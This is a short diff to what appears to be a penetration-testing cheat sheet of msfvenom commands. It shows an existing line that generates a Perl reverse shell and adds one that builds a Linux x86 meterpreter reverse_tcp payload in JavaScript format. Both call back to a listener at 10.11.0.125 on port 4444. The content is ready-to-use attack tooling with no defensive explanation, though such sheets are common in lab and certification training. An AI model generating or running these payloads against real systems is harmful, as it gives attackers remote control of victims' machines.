@@ -30,3 +30,5 @@
 **Perl**
 >msfvenom -p cmd/unix/reverse_perl LHOST=10.11.0.125 LPORT=4444 -f raw > shell.pl 
 
+**JavaScript (little endian)**
+>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.125 LPORT=4444 -f js_le
